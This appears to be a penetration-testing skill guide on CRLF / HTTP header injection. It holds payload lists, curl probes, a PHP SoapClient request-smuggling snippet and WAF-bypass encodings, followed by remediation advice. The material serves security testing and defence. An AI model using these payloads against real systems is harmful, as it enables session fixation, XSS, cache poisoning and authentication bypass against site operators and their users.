---
name: testing-for-crlf-injection
description: Testing web applications for CRLF (Carriage Return / Line Feed) injection where unsanitized %0d%0a sequences
  in user input let an attacker inject HTTP headers, split responses, poison caches, plant cookies, or pivot to XSS and
  request smuggling. Activates when user input is reflected into response headers, Location redirects, log files, or
  outbound requests made by the application.
domain: cybersecurity
subdomain: web-application-security
tags:
- penetration-testing
- crlf-injection
- http-header-injection
- response-splitting
- owasp
- web-security
version: '1.0'
author: Krishna Kumar (xalgord)
license: Apache-2.0
---

# Testing for CRLF / HTTP Header Injection

## When to Use

- When user input is reflected into a response header (`Set-Cookie`, `Location`, `X-*`, custom headers)
- When testing redirect parameters (`?url=`, `?next=`, `?redirect=`) that feed a `Location:` header
- When the app writes user data into log files, session files, or memcache keys without sanitizing `\r\n`
- When an internal HTTP client (PHP `SoapClient`, RestSharp, Refit, Go/Java HTTP libs) builds requests from user input — header injection there enables SSRF / request smuggling
- When pre-auth session state is persisted to disk and later reloaded (newline injection can become an auth bypass)

## Critical: Variants Most Often Missed

Scanners stop after the literal `%0d%0a` is filtered. Carriage Return is `%0d` (`\r`), Line Feed is `%0a` (`\n`). For EVERY reflected/redirect/log parameter, run the full matrix:

```text
# 1. Header injection / cookie planting (single CRLF)
/%0d%0aSet-Cookie:%20mycookie=myvalue
/%0d%0aLocation:%20http://attacker.com

# 2. Response splitting → body injection → XSS (double CRLF ends headers)
?user_input=Value%0d%0a%0d%0a<script>alert(document.domain)</script>
/%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23
/%3f%0d%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection%3a0%0d%0a%0d%0a%3Cscript%3Ealert%28document.domain%29%3C/script%3E

# 3. Inject Content-Encoding to force browser to render attacker body (Praetorian)
%0d%0aContent-Encoding:%20identity%0d%0aContent-Length:%2030%0d%0a

# 4. CRLF chained with open redirect filter bypass
//www.google.com/%2F%2E%2E%0D%0AHeader-Test:test2
/www.google.com/%2E%2E%2F%0D%0AHeader-Test:test2
/google.com/%2F..%0D%0AHeader-Test:test2

# 5. Unicode newline bypass (WAF strips \r\n but back-end normalizes these)
%E5%98%8A   = %0A (\u560a)        %E5%98%8D = %0D (\u560d)
%E2%80%A8   = U+2028 LINE SEPARATOR
%E2%80%A9   = U+2029 PARAGRAPH SEPARATOR
%C2%85      = U+0085 NEXT LINE
# Overlong/UTF-8 combo payload:
%E5%98%8A%E5%98%8DSet-Cookie:%20test
/%0A%E2%80%A8Set-Cookie:%20admin=true

# 6. Connection keep-alive prefix injection → request smuggling / response queue poisoning
GET /%20HTTP/1.1%0d%0aHost:%20redacted.net%0d%0aConnection:%20keep-alive%0d%0a%0d%0a HTTP/1.1
```

### How to CONFIRM a hit (avoid false negatives)

Look at the RAW response (use `curl -i` / Burp, never a browser that re-renders):

- **Header injection**: the injected header appears as a real header line in the response (e.g., a new `Set-Cookie: mycookie=myvalue` or `Header-Test: test2`). Confirm it sits in the header block, not the body.
- **Response splitting**: a second `HTTP/1.1 200 OK` block or your injected `Content-Type: text/html` precedes attacker-controlled body. Browser executes the `<script>`.
- **Open-redirect chain**: a `302` with `Location:` pointing to your domain that the app never intended.
- **Blind / smuggling**: out-of-band callback hits your collaborator, or the next user's response is desynced/poisoned.
- If literal `\r\n` is stripped, a successful Unicode variant proves the back-end normalizes `U+2028/2029/0085` to `\n`.

## Workflow

### Step 1: Identify Reflection / Header Sinks

```bash
# Find params reflected into headers or redirects in Burp proxy history.
# Probe a redirect/header param and inspect raw response headers:
curl -i "https://target.example.com/redirect?url=test%0d%0aX-Injected:%20pwned"
curl -i "https://target.example.com/page?lang=en%0d%0aSet-Cookie:%20crlftest=1"
# If X-Injected / Set-Cookie shows in the header block → injectable.
```

### Step 2: Exploit — Header Injection, Cookie Planting, Response Splitting

```bash
# Plant a cookie (session fixation)
curl -i "https://target.example.com/p?x=%0d%0aSet-Cookie:%20SESSION=attacker"

# Split the response and inject an XSS body
curl -i "https://target.example.com/p?x=val%0d%0a%0d%0a%3Cscript%3Ealert(document.domain)%3C/script%3E"

# Force the browser to render attacker HTML via Content-Encoding: identity
curl -i "https://target.example.com/p?x=v%0d%0aContent-Encoding:%20identity%0d%0aContent-Length:%2030%0d%0a%0d%0a<svg onload=alert(1)>"

# Path-based injection to fully control the response (Starbucks-style)
curl -i "https://target.example.com/%3f%0d%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection%3a0%0d%0a%0d%0a%3Cscript%3Ealert(document.domain)%3C/script%3E"
```

### Step 3: Escalate — Smuggling, SSRF via Internal Clients, Auth Bypass

```php
// PHP SoapClient user_agent header injection → smuggle a full second request
$client = new SoapClient(null, array(
  'uri'      => 'http://127.0.0.1:9090/test',
  'location' => 'http://127.0.0.1:9090/test',
  'user_agent' => "IGN\r\n\r\nPOST /proxy HTTP/1.1\r\nHost: local.host.htb\r\n".
                  "Cookie: PHPSESSID=[PHPSESSID]\r\n".
                  "Content-Type: application/x-www-form-urlencoded\r\n".
                  "Content-Length: 19\r\n\r\nvariable=post value"
));
$client->__soapCall("test", []);
```

```text
# Response-queue poisoning prefix (PortSwigger): keep connection open then smuggle
GET /%20HTTP/1.1%0d%0aHost:%20redacted.net%0d%0aConnection:%20keep-alive%0d%0a%0d%0aGET%20/redirplz%20HTTP/1.1%0d%0aHost:%20oastify.com%0d%0a%0d%0aContent-Length:%2050%0d%0a%0d%0a HTTP/1.1

# Memcache injection (Zimbra-style): inject newline-delimited memcache commands via an
# unsanitized cache key to poison cached credentials.
```

For line-oriented pre-auth session stores, inject CRLF so the serialized session gains trusted keys (`user=root`, `tfa_verified=1`); trigger a session reload to upgrade a pre-auth session into a privileged one.

## Key Concepts

| Concept | Description |
|---------|-------------|
| **CR / LF** | `\r` (`%0d`) and `\n` (`%0a`); together they terminate HTTP header lines |
| **HTTP Header Injection** | Single CRLF lets attacker add headers (`Set-Cookie`, `Location`, CORS) |
| **HTTP Response Splitting** | Double CRLF (`%0d%0a%0d%0a`) ends the header block, allowing a forged body / second response |
| **Unicode newline bypass** | `U+2028/U+2029/U+0085` and overlong `%E5%98%8A` normalize to `\n` after WAF stripping |
| **Response queue poisoning** | Smuggled request desyncs the connection so a later victim gets the attacker's response |
| **Memcache injection** | Newlines in a cache key inject clear-text memcache protocol commands |

## Tools & Systems

| Tool | Purpose |
|------|---------|
| **Burp Suite** | Intercept/repeat requests and read raw response headers; Intruder for parameter sweeps |
| **CRLFsuite** | Fast active CRLF scanner |
| **crlfuzz** | Wordlist-based fuzzer with Unicode newline payloads |
| **crlfix** | Tests CRLF handling in Go-generated HTTP requests / internal services |
| **curl -i** | Manual confirmation of injected headers in the raw response |
| **Auto_Wordlists/crlf.txt** | Curated CRLF payload list |

## Common Scenarios

### Scenario 1: Redirect Parameter → Set-Cookie
A `?url=` redirect reflects into the `Location` header. `?url=%0d%0aSet-Cookie:%20SESSION=fixed` plants an attacker-controlled session cookie, enabling session fixation.

### Scenario 2: WAF Strips \r\n but Unicode Works
The proxy removes literal `%0d%0a`, so basic payloads fail. `%E5%98%8A%E5%98%8DSet-Cookie:%20test` is normalized to a real CRLF by the Java back-end and the header is injected — a confirmed bypass.

### Scenario 3: Internal HTTP Client (CVE-2024-45302 RestSharp)
A back-end microservice builds requests with `client.AddHeader("X-Foo", userInput)`. Injecting `bar%0d%0aHost:evil` adds a second `Host` header, enabling SSRF / request smuggling against internal services.

## Output Format

```
## CRLF / HTTP Header Injection Finding

**Vulnerability**: CRLF Injection / HTTP Response Splitting
**Severity**: High (CVSS 7.4–8.8 depending on chain)
**Location**: GET /redirect?url=<CRLF payload>
**OWASP Category**: A03:2021 - Injection

### Reproduction Steps
1. Send: GET /redirect?url=val%0d%0aSet-Cookie:%20crlftest=1 HTTP/1.1
2. Observe raw response contains an injected header: Set-Cookie: crlftest=1
3. Escalate with %0d%0a%0d%0a<script>alert(document.domain)</script> to inject body/XSS

### Evidence
| Payload | Observed Header/Body | Effect |
|---------|----------------------|--------|
| %0d%0aSet-Cookie:... | Set-Cookie injected | Cookie planting / session fixation |
| %0d%0a%0d%0a<script>... | Reflected in body, executed | Stored/reflected XSS |
| Unicode %E5%98%8A%E5%98%8D | CRLF after normalization | WAF bypass |

### Impact
Cookie planting, XSS without script-in-body filters, cache poisoning, open-redirect chaining, and (via internal clients) SSRF / request smuggling.

### Recommendation
1. Never place raw user input into response headers; use framework header APIs that reject CR/LF.
2. Strip/encode CR, LF, and Unicode line terminators (U+2028, U+2029, U+0085) before use.
3. Update HTTP client libraries to versions that sanitize headers (e.g., RestSharp ≥110.2.0).
4. Use allow-lists for redirect targets and validate session/cache keys.
```
